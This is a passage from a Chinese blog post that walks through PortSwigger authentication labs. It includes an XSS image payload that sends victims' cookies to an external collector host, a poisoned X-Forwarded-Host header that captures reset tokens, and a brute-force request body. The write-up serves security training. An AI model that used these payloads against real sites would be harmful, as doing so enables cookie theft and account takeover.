+<p>​            This lab stores the user’s password hash in a cookie. The  lab also contains an XSS vulnerability in the comment functionality. To  solve the lab, obtain Carlos’s <code>stay-logged-in</code> cookie and use it to crack his password. Then, log in as <code>carlos</code> and delete his account from the “My account” page.        </p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​				Victim’s username: <code>carlos</code></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>先得利用评论区的xss盗取用户cookie（burp起一个服务器，往上面发cookie就行），然后和上一题一样破解 stay-logged-in 得到里面受害者的账号和密码。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;src=&#x27;http://716ue1npdsgckv7ygx50n5wdl4rvfl3a.oastify.com?id=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-Password-reset-broken-logic"><a href="#Lab-Password-reset-broken-logic" class="headerlink" title="Lab: Password reset broken logic"></a>Lab: Password reset broken logic</h3><blockquote>
+<p>​            This lab’s password reset functionality is vulnerable. To  solve the lab, reset Carlos’s password then log in and access his “My  account” page.        </p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​				Victim’s username: <code>carlos</code></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>点击重置密码，先充值自己的账户，在邮箱处发现重置接口，点击然后抓包修改用户名为受害者，就能重置受害者密码，虽然这个包有token，但是没有校验，导致可以任意用户密码重置。</p>
+<h3 id="Lab-Password-reset-poisoning-via-middleware"><a href="#Lab-Password-reset-poisoning-via-middleware" class="headerlink" title="Lab: Password reset poisoning via middleware"></a>Lab: Password reset poisoning via middleware</h3><blockquote>
+<p>This lab is vulnerable to password reset poisoning. The user <code>carlos</code> will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos’s account.             You can log in to your own account using the following credentials: <code>wiener:peter</code>. Any emails sent to this account can be read via the email client on the exploit server.        </p>
+<p>密码重置投毒是一种攻击者利用漏洞网站生成指向其控制域名的密码重置链接的技术。攻击者可以利用此行为窃取重置任意用户密码所需的秘密令牌，最终盗取用户的账户。         </p>
+</blockquote>
+<p>这题 token 做了校验了</p>
+<p>这道题利用信任 Host 或 X-Forwarded-Host 导致主机头注入（Host header injection），服务器会信任X-Forwarded-Host的主机，并且<strong>错误地</strong>使用 req.headers.host（或 X-Forwarded-Host）来构造这个重置密码的链接。</p>
+<p>比如服务器使用 X-Forwarded-Host（或 Host）拼 URL，邮件里的链接变成 <a target="_blank" rel="noopener" href="https://attacker.example/reset?token=...%EF%BC%8C%E8%BF%99%E9%A2%98%E7%9A%84%E9%82%AE%E4%BB%B6%E9%93%BE%E6%8E%A5%E5%88%99%E6%98%AF">https://attacker.example/reset?token=...，这题的邮件链接则是</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0a2400a204eb685280b5128d004b00ef.web-security-academy.net/forgot-password?temp-forgot-password-token=dq032a5pcmgvfbxwq76uumx4lay8te2q</span><br></pre></td></tr></table></figure>
+
+<p>而这个受害者 token 是我们想得到的，有了这个token就能篡改密码了</p>
+<p>所以我们给重置密码的用户名改成受害者，再添加我们可以控制的服务器作为原始请求的 Host 值，发包。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: exploit-0ab900e304c3681880b4114b01440083.exploit-server.net/</span><br></pre></td></tr></table></figure>
+
+<p>这样服务器就会生成包含我们可控的恶意服务器的链接，用户点了就会把他的token带过来访问，我们就能在恶意服务器的日志里看到受害者的token了。</p>
+<h3 id="Lab-Password-brute-force-via-password-change"><a href="#Lab-Password-brute-force-via-password-change" class="headerlink" title="Lab: Password brute-force via password change"></a>Lab: Password brute-force via password change</h3><blockquote>
+<p>​            This lab’s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate  passwords to brute-force Carlos’s account and access his “My account”  page.        </p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​				Victim’s username: <code>carlos</code> 		</li>
+<li>​				<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>修改密码处参数不同返回不同状态</p>
+<p>当前密码错误，修改密码和确认修改密码一样的话错误会302跳转回登录页面并且被锁定账号一分钟</p>
+<p>当前密码正确，修改密码和确认修改密码不一样会返回</p>
+<blockquote>
+<p>New passwords do not match</p>
+</blockquote>
+<p>当前密码不正确，修改密码和确认修改密码不一样会返回 &#x3D;&gt; “当前密码错误”,且不会被锁定账号导致无法爆破。</p>
+<p>所以我们根据这个来爆破用户密码，设置不一样的新密码爆破当前密码，直到碰到 New passwords do not match</p>
+<blockquote>
+<p>username&#x3D;carlos&amp;current-password&#x3D;1234&amp;new-password-1&#x3D;1&amp;new-password-2&#x3D;2</p>
+</blockquote>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://example.com/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://example.com/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/&title=PortSwigger Authentication - sleeper&summary=AuthenticationLab: Username enumeration via different responses
+​            This lab is vulnerable to username enume..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=PortSwigger Authentication - sleeper&amp;body=http://example.com/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://example.com/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/10/14/%E9%9D%B6%E5%9C%BA/PortSwigger/Information%20Disclosure/">PortSwigger Information Disclosure</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">she11f</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Authentication"><span class="toc-text">Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Username-enumeration-via-different-responses"><span class="toc-text">Lab: Username enumeration via different responses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Username-enumeration-via-subtly-different-responses"><span class="toc-text">Lab: Username enumeration via subtly different responses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Username-enumeration-via-response-timing"><span class="toc-text">Lab: Username enumeration via response timing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Broken-brute-force-protection-IP-block"><span class="toc-text">Lab: Broken brute-force protection, IP block</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Username-enumeration-via-account-lock"><span class="toc-text">Lab: Username enumeration via account lock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Broken-brute-force-protection-multiple-credentials-per-request"><span class="toc-text">Lab: Broken brute-force protection, multiple credentials per request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-2FA-simple-bypass"><span class="toc-text">Lab: 2FA simple bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-2FA-broken-logic"><span class="toc-text">Lab: 2FA broken logic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-2FA-bypass-using-a-brute-force-attack"><span class="toc-text">Lab: 2FA bypass using a brute-force attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Brute-forcing-a-stay-logged-in-cookie"><span class="toc-text">Lab: Brute-forcing a stay-logged-in cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Offline-password-cracking"><span class="toc-text">Lab: Offline password cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Password-reset-broken-logic"><span class="toc-text">Lab: Password reset broken logic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Password-reset-poisoning-via-middleware"><span class="toc-text">Lab: Password reset poisoning via middleware</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Password-brute-force-via-password-change"><span class="toc-text">Lab: Password brute-force via password change</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
